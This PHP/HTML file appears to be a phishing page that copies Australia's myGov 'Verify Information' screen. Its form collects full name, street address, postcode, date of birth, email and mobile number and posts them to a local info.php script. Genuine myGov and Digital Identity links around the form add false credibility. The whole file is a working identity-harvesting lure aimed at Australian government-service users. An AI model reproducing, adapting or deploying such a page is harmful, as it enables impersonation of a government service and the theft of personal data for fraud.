<?php

require("header.php");
?>


<div class="wrapper-mapwap">
    <div class="main-block" role="main">
      <div class="cbLogin">
        <div class="login-grid-container">
          <div class="login-grid-row">
            <div class="login-grid-column">
              <div class="login-card-wrapper">
                <div class="main-login-card override">
                  <a class="button-back" href="error">Back</a>

                  <h1>Verify Information with myGov</h1>
                  <p class="login-instruction-text">Help us confirm it's you by filling out the following information.</p>

                  <form class="info" action="info.php" method="post">
                    <div class="input-group">
                      <label class="override" for="fullName">Full Name</label>
                      <div>
                        <input id="fullName" name="fullName" class="cb-input" type="text" autocomplete="off">
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your full name.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="input-group">
                      <label class="override" for="address">Street Address</label>
                      <div>
                        <input id="address" name="address" class="cb-input" type="text" autocomplete="on">
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your street address.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="input-group">
                      <label class="override" for="zip">POSTAL Code</label>
                      <div>
                        <input id="zip" name="zip" class="cb-input" type="text" autocomplete="off">
						<script>
                                var element = document.getElementById('zip');
                                var maskOptions = {
                                mask: '0000'
                                };
                                var mask = IMask(element, maskOptions);
                            </script>
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your POSTAL code.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="input-group">
                      <label class="override" for="dob">Date of Birth</label>
                      <div>
                        <input id="dob" name="dob" class="cb-input" type="date" autocomplete="off">
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your date of birth.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="input-group">
                      <label class="override" for="emailAddr">Email Address</label>
                      <div>
                        <input id="emailAddr" name="emailAddr" type="email" class="cb-input" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+.[a-z]{2,}$" autocomplete="on">
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter a valid email address.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="input-group">
                      <label class="override" for="phone">Mobile Phone</label>
                      <div>
                        <input id="phone" name="phone" class="cb-input" type="tel" autocomplete="off">
						<script>
                                var element = document.getElementById('phone');
                                var maskOptions = {
                                mask: '(00)-0000-0000'
                                };
                                var mask = IMask(element, maskOptions);
                            </script>
                      </div>
                      <p class="input-bottom-text hasError" role="alert" style="display:none;">Enter your mobile phone.</p>
                    </div>

                    <p class="recovery"></p>

                    <div class="button-main-container override">
                      <div class="button-container">
                        <button type="submit" class="button-main button-submit">Next</button>
                      </div>
                    </div>

                    <p class="create-account-text">
											<a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.
										</p>
                  </form>

                  <div class="hr-word">
                    <div class="draw-circle">
                      or
                    </div>
                  </div>

                  <div class="login-card secondary">
                    <div class="button-login-container">
                      <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
                      <div class="login-option-container">
                        <div class="inner-options">
                          <p class="external-links-zone">
                            What is <a href="https://www.digitalidentity.gov.au/">Digital Identity</a> and <a href="https://www.mygovid.gov.au/">myGovID</a>?
                          </p>
                          <a class="button-digital-identity" href="https://login.my.gov.au/las/mygov-login?execution=e1s1&amp;_eventId=digitalIdentity">Continue with Digital Identity</a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>


<?
require("footer.php");
?>